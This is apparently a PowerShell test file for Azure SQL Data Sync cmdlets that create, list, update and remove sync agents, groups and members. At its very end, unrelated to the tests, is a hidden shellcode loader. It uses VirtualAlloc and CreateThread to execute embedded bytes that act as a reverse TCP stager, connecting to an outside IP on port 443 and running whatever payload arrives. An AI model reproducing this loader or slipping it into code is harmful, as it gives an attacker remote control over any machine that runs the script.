














function Test-CreateSyncAgent
{
    
    $rg = Create-ResourceGroupForTest
    $server = Create-ServerForTest $rg "West US 2"
    $databaseName = Get-DatabaseName
    $db = New-AzSqlDatabase -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName -DatabaseName $databaseName

    try
    {
        
        $saName = Get-SyncAgentName
        $sa = New-AzSqlSyncAgent -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName `
                -SyncAgentName $saName -SyncDatabaseResourceGroupName $rg.ResourceGroupName -SyncDatabaseServerName $server.ServerName `
                -SyncDatabaseName $databaseName
        Assert-NotNull $sa
        Assert-AreEqual $saName $sa.SyncAgentName
    }
    finally
    {
        Remove-ResourceGroupForTest $rg
    }
}


function Test-GetAndListSyncAgents
{
    
    $rg = Create-ResourceGroupForTest
    $server = Create-ServerForTest $rg "West US 2"
    $databaseName = Get-DatabaseName
    $db = New-AzSqlDatabase -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName -DatabaseName $databaseName

    
    $saName = Get-SyncAgentName
    $sa = New-AzSqlSyncAgent -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName `
            -SyncAgentName $saName -SyncDatabaseResourceGroupName $rg.ResourceGroupName -SyncDatabaseServerName $server.ServerName `
            -SyncDatabaseName $databaseName
    try
    {
        
        $sa2 = Get-AzSqlSyncAgent -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName -SyncAgentName $saName
        Assert-NotNull $sa2
        Assert-AreEqual $saName $sa2.SyncAgentName

        
        $all = Get-AzSqlSyncAgent -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName -SyncAgentName *
        Assert-NotNull $all
        Assert-AreEqual $all.Count 1
    }
    finally
    {
        Remove-ResourceGroupForTest $rg
    }
}


function Test-RemoveSyncAgent
{
    
    $rg = Create-ResourceGroupForTest
    $server = Create-ServerForTest $rg "West US 2"
    $databaseName = Get-DatabaseName
    $db = New-AzSqlDatabase -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName -DatabaseName $databaseName
    $saName = Get-SyncAgentName
    $sa = New-AzSqlSyncAgent -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName `
            -SyncAgentName $saName -SyncDatabaseResourceGroupName $rg.ResourceGroupName -SyncDatabaseServerName $server.ServerName `
            -SyncDatabaseName $databaseName
    try
    {
        
        Remove-AzSqlSyncAgent -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName `
         -SyncAgentName $saName -Force

        $all = Get-AzSqlSyncAgent -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName
        Assert-AreEqual $all.Count 0
    }
    finally
    {
        Remove-ResourceGroupForTest $rg
    }
}


function Test-CreateSyncAgentKey
{
    
    $rg = Create-ResourceGroupForTest
    $server = Create-ServerForTest $rg "West US 2"
    $databaseName = Get-DatabaseName
    $db = New-AzSqlDatabase -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName -DatabaseName $databaseName
    $saName = Get-SyncAgentName
    $sa = New-AzSqlSyncAgent -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName `
            -SyncAgentName $saName -SyncDatabaseResourceGroupName $rg.ResourceGroupName -SyncDatabaseServerName $server.ServerName `
            -SyncDatabaseName $databaseName
    try
    {
        
        $key = New-AzSqlSyncAgentKey -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName `
         -SyncAgentName $saName

        Assert-NotNull $key
        Assert-NotNull $key.SyncAgentKey
    }
    finally
    {
        Remove-ResourceGroupForTest $rg
    }
}


function Test-ListSyncAgentLinkedDatabase
{
    
    $rg = Create-ResourceGroupForTest
    $server = Create-ServerForTest $rg "West US 2"
    $databaseName = Get-DatabaseName
    $db = New-AzSqlDatabase -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName -DatabaseName $databaseName
    $saName = Get-SyncAgentName
    $sa = New-AzSqlSyncAgent -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName `
            -SyncAgentName $saName -SyncDatabaseResourceGroupName $rg.ResourceGroupName -SyncDatabaseServerName $server.ServerName `
            -SyncDatabaseName $databaseName
    try
    {
        
        $dbs = Get-AzSqlSyncAgentLinkedDatabase -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName `
         -SyncAgentName $saName
        Assert-Null $dbs
    }
    finally
    {
        Remove-ResourceGroupForTest $rg
    }
}


function Test-CreateSyncGroup
{
    
    $rg = Create-ResourceGroupForTest
    $server = Create-ServerForTest $rg "West US 2"
    $credential = Get-ServerCredential
    $databaseName = Get-DatabaseName
    $db = New-AzSqlDatabase -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName -DatabaseName $databaseName
    $syncDatabaseName = Get-DatabaseName
    $syncdb = New-AzSqlDatabase -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName -DatabaseName $syncDatabaseName
    $params = Get-SqlSyncGroupTestEnvironmentParameters

    try
    {
        
        $sgName = Get-SyncGroupName
        $sg = New-AzSqlSyncGroup -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName `
            -DatabaseName $databaseName -SyncGroupName $sgName -IntervalInSeconds $params.intervalInSeconds `
            -ConflictResolutionPolicy $params.conflictResolutionPolicy -SyncDatabaseName $syncDatabaseName -SyncDatabaseServerName `
            $server.ServerName -SyncDatabaseResourceGroupName $rg.ResourceGroupName -DatabaseCredential $credential
        Assert-AreEqual $params.intervalInSeconds $sg.IntervalInSeconds
        Assert-AreEqual $params.conflictResolutionPolicy $sg.ConflictResolutionPolicy
    }
    finally
    {
        Remove-ResourceGroupForTest $rg
    }
}


function Test-UpdateSyncGroup
{
    
    $rg = Create-ResourceGroupForTest
    $server = Create-ServerForTest $rg "West US 2"
    $credential = Get-ServerCredential
    $databaseName = Get-DatabaseName
    $db = New-AzSqlDatabase -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName -DatabaseName $databaseName
    $syncDatabaseName = Get-DatabaseName
    $syncdb = New-AzSqlDatabase -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName -DatabaseName $syncDatabaseName
    $params = Get-SqlSyncGroupTestEnvironmentParameters
    
    $sgName = Get-SyncGroupName
    $sg = New-AzSqlSyncGroup -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName `
        -DatabaseName $databaseName -SyncGroupName $sgName -IntervalInSeconds $params.intervalInSeconds `
        -ConflictResolutionPolicy $params.conflictResolutionPolicy -SyncDatabaseName $syncDatabaseName -SyncDatabaseServerName `
        $server.ServerName -SyncDatabaseResourceGroupName $rg.ResourceGroupName -DatabaseCredential $credential
    try
    {
        
        $newIntervalInSeconds = 200
        $sg2 = Update-AzSqlSyncGroup -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName `
            -DatabaseName $databaseName -SyncGroupName $sgName -IntervalInSeconds $newIntervalInSeconds 
        Assert-AreEqual $newIntervalInSeconds $sg2.IntervalInSeconds
    }
    finally
    {
        Remove-ResourceGroupForTest $rg
    }
}


function Test-GetAndListSyncGroups
{
    
    $rg = Create-ResourceGroupForTest
    $server = Create-ServerForTest $rg "West US 2"
    $credential = Get-ServerCredential
    $databaseName = Get-DatabaseName
    $db = New-AzSqlDatabase -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName -DatabaseName $databaseName
    $syncDatabaseName = Get-DatabaseName
    $syncdb = New-AzSqlDatabase -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName -DatabaseName $syncDatabaseName
    $params = Get-SqlSyncGroupTestEnvironmentParameters
    
    $sgName = Get-SyncGroupName
    $sg = New-AzSqlSyncGroup -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName `
        -DatabaseName $databaseName -SyncGroupName $sgName -IntervalInSeconds $params.intervalInSeconds `
        -ConflictResolutionPolicy $params.conflictResolutionPolicy -SyncDatabaseName $syncDatabaseName -SyncDatabaseServerName `
        $server.ServerName -SyncDatabaseResourceGroupName $rg.ResourceGroupName -DatabaseCredential $credential
    try
    {
        
        $sg1 = Get-AzSqlSyncGroup -ServerName $server.ServerName -ResourceGroupName $rg.ResourceGroupName `
        -DatabaseName $databaseName -SyncGroupName $sgName
        Assert-AreEqual $params.intervalInSeconds $sg1.IntervalInSeconds
        Assert-AreEqual $params.conflictResolutionPolicy $sg1.ConflictResolutionPolicy

        
        $all = Get-AzSqlSyncGroup -ServerName $server.ServerName -ResourceGroupName $rg.ResourceGroupName `
        -DatabaseName $databaseName -SyncGroupName *
        Assert-AreEqual $all.Count 1
        Assert-AreEqual $params.intervalInSeconds $all[0].IntervalInSeconds
        Assert-AreEqual $params.conflictResolutionPolicy $all[0].ConflictResolutionPolicy
    }
    finally
    {
        Remove-ResourceGroupForTest $rg
    }
}


function Test-RefreshAndGetSyncGroupHubSchema
{
    
    $rg = Create-ResourceGroupForTest
    $server = Create-ServerForTest $rg "West US 2"
    $credential = Get-ServerCredential
    $databaseName = Get-DatabaseName
    $db = New-AzSqlDatabase -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName -DatabaseName $databaseName
    $syncDatabaseName = Get-DatabaseName
    $syncdb = New-AzSqlDatabase -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName -DatabaseName $syncDatabaseName
    $params = Get-SqlSyncGroupTestEnvironmentParameters
    
    $sgName = Get-SyncGroupName
    $sg = New-AzSqlSyncGroup -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName `
        -DatabaseName $databaseName -SyncGroupName $sgName -IntervalInSeconds $params.intervalInSeconds `
        -ConflictResolutionPolicy $params.conflictResolutionPolicy -SyncDatabaseName $syncDatabaseName -SyncDatabaseServerName `
        $server.ServerName -SyncDatabaseResourceGroupName $rg.ResourceGroupName -DatabaseCredential $credential
    try
    {
        
        Update-AzSqlSyncSchema -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName `
            -DatabaseName $databaseName -SyncGroupName $sgName

        
        $schema = Get-AzSqlSyncSchema -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName `
            -DatabaseName $databaseName -SyncGroupName $sgName
        Assert-NotNull $schema
    }
    finally
    {
        Remove-ResourceGroupForTest $rg
    }
}


function Test-RemoveSyncGroup
{
    
    $rg = Create-ResourceGroupForTest
    $server = Create-ServerForTest $rg "West US 2"
    $credential = Get-ServerCredential
    $databaseName = Get-DatabaseName
    $db = New-AzSqlDatabase -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName -DatabaseName $databaseName
    $syncDatabaseName = Get-DatabaseName
    $syncdb = New-AzSqlDatabase -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName -DatabaseName $syncDatabaseName
    $params = Get-SqlSyncGroupTestEnvironmentParameters
    
    $sgName = Get-SyncGroupName
    $sg = New-AzSqlSyncGroup -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName `
        -DatabaseName $databaseName -SyncGroupName $sgName -IntervalInSeconds $params.intervalInSeconds `
        -ConflictResolutionPolicy $params.conflictResolutionPolicy -SyncDatabaseName $syncDatabaseName -SyncDatabaseServerName `
        $server.ServerName -SyncDatabaseResourceGroupName $rg.ResourceGroupName -DatabaseCredential $credential
    try
    {
        
        Remove-AzSqlSyncGroup -ServerName $server.ServerName -ResourceGroupName $rg.ResourceGroupName `
        -DatabaseName $databaseName -SyncGroupName $sgName -Force
        
        $all = Get-AzSqlSyncGroup -ServerName $server.ServerName -ResourceGroupName $rg.ResourceGroupName `
        -DatabaseName $databaseName
        Assert-AreEqual $all.Count 0
    }
    finally
    {
        Remove-ResourceGroupForTest $rg
    }
}


function Test-CreateSyncMember
{
    
    $rg = Create-ResourceGroupForTest 
    $server = Create-ServerForTest $rg "West US 2"
    $serverDNS = Get-DNSNameBasedOnEnvironment
    $serverName = $server.ServerName + $serverDNS
    $credential = Get-ServerCredential
    $databaseName1 = Get-DatabaseName
    $db1 = New-AzSqlDatabase -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName -DatabaseName $databaseName1
    $databaseName2 = Get-DatabaseName
    $db2 = New-AzSqlDatabase -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName -DatabaseName $databaseName2
    $syncDatabaseName = Get-DatabaseName
    $syncdb = New-AzSqlDatabase -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName -DatabaseName $syncDatabaseName
    
    $params = Get-SqlSyncGroupTestEnvironmentParameters
    $sgName = Get-SyncGroupName
    $sg = New-AzSqlSyncGroup -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName `
                -DatabaseName $databaseName1 -SyncGroupName $sgName -IntervalInSeconds $params.intervalInSeconds `
                -ConflictResolutionPolicy $params.conflictResolutionPolicy -SyncDatabaseName $syncDatabaseName -SyncDatabaseServerName `
                $server.ServerName -SyncDatabaseResourceGroupName $rg.ResourceGroupName -DatabaseCredential $credential

    try
    {
        
        $smParams = Get-SqlSyncMemberTestEnvironmentParameters
        $smName = Get-SyncMemberName
        $sm1 = New-AzSqlSyncMember -ServerName $server.ServerName -ResourceGroupName $rg.ResourceGroupName `
            -DatabaseName $databaseName1 -SyncGroupName $sgName -SyncMemberName $smName `
            -SyncDirection $smParams.syncDirection -MemberDatabaseType $smParams.databaseType -MemberDatabaseName $databaseName2 `
            -MemberServerName $serverName -MemberDatabaseCredential $credential
        Assert-AreEqual $smParams.syncDirection $sm1.SyncDirection
        Assert-AreEqual $smParams.databaseType $sm1.MemberDatabaseType
        Assert-AreEqual $databaseName2 $sm1.MemberDatabaseName
        Assert-AreEqual $serverName $sm1.MemberServerName
        Assert-Null $sm1.MemberDatabasePassword
        Assert-Null $sm1.SyncAgentId
        Assert-Null $sm1.SqlServerDatabaseId
    }
    finally
    {
        Remove-ResourceGroupForTest $rg
    }
}


function Test-GetAndListSyncMembers
{
    
    $rg = Create-ResourceGroupForTest
    $server = Create-ServerForTest $rg "West US 2"
    $serverDNS = Get-DNSNameBasedOnEnvironment
    $serverName = $server.ServerName + $serverDNS
    $credential = Get-ServerCredential
    $databaseName1 = Get-DatabaseName
    $db1 = New-AzSqlDatabase -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName -DatabaseName $databaseName1
    $databaseName2 = Get-DatabaseName
    $db2 = New-AzSqlDatabase -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName -DatabaseName $databaseName2
    $syncDatabaseName = Get-DatabaseName
    $syncdb = New-AzSqlDatabase -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName -DatabaseName $syncDatabaseName
        
    $params = Get-SqlSyncGroupTestEnvironmentParameters
    $sgName = Get-SyncGroupName
    $sg = New-AzSqlSyncGroup -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName `
                -DatabaseName $databaseName1 -SyncGroupName $sgName -IntervalInSeconds $params.intervalInSeconds `
                -ConflictResolutionPolicy $params.conflictResolutionPolicy -SyncDatabaseName $syncDatabaseName -SyncDatabaseServerName `
                $server.ServerName -SyncDatabaseResourceGroupName $rg.ResourceGroupName -DatabaseCredential $credential
    
    $smParams = Get-SqlSyncMemberTestEnvironmentParameters
    $smName = Get-SyncMemberName
    $sm1 = New-AzSqlSyncMember -ServerName $server.ServerName -ResourceGroupName $rg.ResourceGroupName `
        -DatabaseName $databaseName1 -SyncGroupName $sgName -SyncMemberName $smName `
        -SyncDirection $smParams.syncDirection -MemberDatabaseType $smParams.databaseType -MemberDatabaseName $databaseName2 `
        -MemberServerName $serverName -MemberDatabaseCredential $credential
    try
    {
        
        $sm2 = Get-AzSqlSyncMember -ServerName $server.ServerName -ResourceGroupName $rg.ResourceGroupName `
        -DatabaseName $databaseName1 -SyncGroupName $sg.SyncGroupName -SyncMemberName $smName
        Assert-AreEqual $smParams.syncDirection $sm1.SyncDirection
        Assert-AreEqual $smParams.databaseType $sm1.MemberDatabaseType
        Assert-AreEqual $databaseName2 $sm1.MemberDatabaseName
        Assert-AreEqual $serverName $sm1.MemberServerName
        Assert-Null $sm1.MemberDatabasePassword
        Assert-Null $sm1.SyncAgentId
        Assert-Null $sm1.SqlServerDatabaseId

        
        $all = Get-AzSqlSyncMember -ServerName $server.ServerName -ResourceGroupName $rg.ResourceGroupName `
        -DatabaseName $databaseName1 -SyncGroupName $sg.SyncGroupName -SyncMemberName *
        Assert-AreEqual 1 $all.Count
        Assert-AreEqual $smParams.syncDirection $all[0].SyncDirection
        Assert-AreEqual $smParams.databaseType $all[0].MemberDatabaseType
    }
    finally
    {
        Remove-ResourceGroupForTest $rg
    }
}


function Test-UpdateSyncMember
{
    
    $rg = Create-ResourceGroupForTest
    $server = Create-ServerForTest $rg "West US 2"
    $serverDNS = Get-DNSNameBasedOnEnvironment
    $serverName = $server.ServerName + $serverDNS
    $credential = Get-ServerCredential
    $databaseName1 = Get-DatabaseName
    $db1 = New-AzSqlDatabase -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName -DatabaseName $databaseName1
    $databaseName2 = Get-DatabaseName
    $db2 = New-AzSqlDatabase -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName -DatabaseName $databaseName2
    $syncDatabaseName = Get-DatabaseName
    $syncdb = New-AzSqlDatabase -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName -DatabaseName $syncDatabaseName
    
    $params = Get-SqlSyncGroupTestEnvironmentParameters
    $sgName = Get-SyncGroupName
    $sg = New-AzSqlSyncGroup -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName `
                -DatabaseName $databaseName1 -SyncGroupName $sgName -IntervalInSeconds $params.intervalInSeconds `
                -ConflictResolutionPolicy $params.conflictResolutionPolicy -SyncDatabaseName $syncDatabaseName -SyncDatabaseServerName `
                $server.ServerName -SyncDatabaseResourceGroupName $rg.ResourceGroupName -DatabaseCredential $credential
    
    $smParams = Get-SqlSyncMemberTestEnvironmentParameters
    $smName = Get-SyncMemberName
    $sm1 = New-AzSqlSyncMember -ServerName $server.ServerName -ResourceGroupName $rg.ResourceGroupName `
        -DatabaseName $databaseName1 -SyncGroupName $sgName -SyncMemberName $smName `
        -SyncDirection $smParams.syncDirection -MemberDatabaseType $smParams.databaseType -MemberDatabaseName $databaseName2 `
        -MemberServerName $serverName -MemberDatabaseCredential $credential
    try
    {
        
        $sm2 = Update-AzSqlSyncMember -ServerName $server.ServerName -ResourceGroupName $rg.ResourceGroupName `
            -DatabaseName $databaseName1 -SyncGroupName $sgName -SyncMemberName $smName `
            -MemberDatabaseCredential $credential
        Assert-AreEqual $smParams.databaseType $sm2.MemberDatabaseType
        Assert-AreEqual $databaseName2 $sm2.MemberDatabaseName
        Assert-AreEqual $serverName $sm2.MemberServerName
        Assert-Null $sm2.MemberDatabasePassword
        Assert-Null $sm2.SyncAgentId
        Assert-Null $sm2.SqlServerDatabaseId
    }
    finally
    {
        Remove-ResourceGroupForTest $rg
    }
}


function Test-RefreshAndGetSyncMemberSchema
{
    
    $rg = Create-ResourceGroupForTest
    $server = Create-ServerForTest $rg "West US 2"
    $serverDNS = Get-DNSNameBasedOnEnvironment
    $serverName = $server.ServerName + $serverDNS
    $credential = Get-ServerCredential
    $databaseName1 = Get-DatabaseName
    $db1 = New-AzSqlDatabase -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName -DatabaseName $databaseName1
    $databaseName2 = Get-DatabaseName
    $db2 = New-AzSqlDatabase -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName -DatabaseName $databaseName2
    $syncDatabaseName = Get-DatabaseName
    $syncdb = New-AzSqlDatabase -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName -DatabaseName $syncDatabaseName
    
    $params = Get-SqlSyncGroupTestEnvironmentParameters
    $sgName = Get-SyncGroupName
    $sg = New-AzSqlSyncGroup -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName `
                -DatabaseName $databaseName1 -SyncGroupName $sgName -IntervalInSeconds $params.intervalInSeconds `
                -ConflictResolutionPolicy $params.conflictResolutionPolicy -SyncDatabaseName $syncDatabaseName -SyncDatabaseServerName `
                $server.ServerName -SyncDatabaseResourceGroupName $rg.ResourceGroupName -DatabaseCredential $credential
    
    $smParams = Get-SqlSyncMemberTestEnvironmentParameters
    $smName = Get-SyncMemberName
    $sm1 = New-AzSqlSyncMember -ServerName $server.ServerName -ResourceGroupName $rg.ResourceGroupName `
        -DatabaseName $databaseName1 -SyncGroupName $sgName -SyncMemberName $smName `
        -SyncDirection $smParams.syncDirection -MemberDatabaseType $smParams.databaseType -MemberDatabaseName $databaseName2 `
        -MemberServerName $serverName -MemberDatabaseCredential $credential
    try
    {
        
        Update-AzSqlSyncSchema -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName `
            -DatabaseName $databaseName1 -SyncGroupName $sgName -SyncMemberName $smName 

        
        $schema = Get-AzSqlSyncSchema -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName `
            -DatabaseName $databaseName1 -SyncGroupName $sgName -SyncMemberName $smName 
        Assert-NotNull $schema
    }
    finally
    {    
        Remove-ResourceGroupForTest $rg
    }
}


function Test-RemoveSyncMember
{
    
    $rg = Create-ResourceGroupForTest
    $server = Create-ServerForTest $rg "West US 2"
    $serverDNS = Get-DNSNameBasedOnEnvironment
    $serverName = $server.ServerName + $serverDNS
    $credential = Get-ServerCredential
    $databaseName1 = Get-DatabaseName
    $db1 = New-AzSqlDatabase -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName -DatabaseName $databaseName1
    $databaseName2 = Get-DatabaseName
    $db2 = New-AzSqlDatabase -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName -DatabaseName $databaseName2
    $syncDatabaseName = Get-DatabaseName
    $syncdb = New-AzSqlDatabase -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName -DatabaseName $syncDatabaseName
    
    $params = Get-SqlSyncGroupTestEnvironmentParameters
    $sgName = Get-SyncGroupName
    $sg = New-AzSqlSyncGroup -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName `
                -DatabaseName $databaseName1 -SyncGroupName $sgName -IntervalInSeconds $params.intervalInSeconds `
                -ConflictResolutionPolicy $params.conflictResolutionPolicy -SyncDatabaseName $syncDatabaseName -SyncDatabaseServerName `
                $server.ServerName -SyncDatabaseResourceGroupName $rg.ResourceGroupName -DatabaseCredential $credential
    
    $smParams = Get-SqlSyncMemberTestEnvironmentParameters
    $smName = Get-SyncMemberName
    $sm1 = New-AzSqlSyncMember -ServerName $server.ServerName -ResourceGroupName $rg.ResourceGroupName `
        -DatabaseName $databaseName1 -SyncGroupName $sgName -SyncMemberName $smName `
        -SyncDirection $smParams.syncDirection -MemberDatabaseType $smParams.databaseType -MemberDatabaseName $databaseName2 `
        -MemberServerName $serverName -MemberDatabaseCredential $credential
    try
    {
        
        Remove-AzSqlSyncMember -ServerName $server.ServerName -ResourceGroupName $rg.ResourceGroupName `
        -DatabaseName $databaseName1 -SyncGroupName $sgName -SyncMemberName $smName -Force
        
        $all = Get-AzSqlSyncMember -ServerName $server.ServerName -ResourceGroupName $rg.ResourceGroupName `
        -DatabaseName $databaseName1 -SyncGroupName $sgName
        Assert-AreEqual $all.Count 0
    }
    finally
    {
        Remove-ResourceGroupForTest $rg
    }
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x0a,0x64,0x66,0x03,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

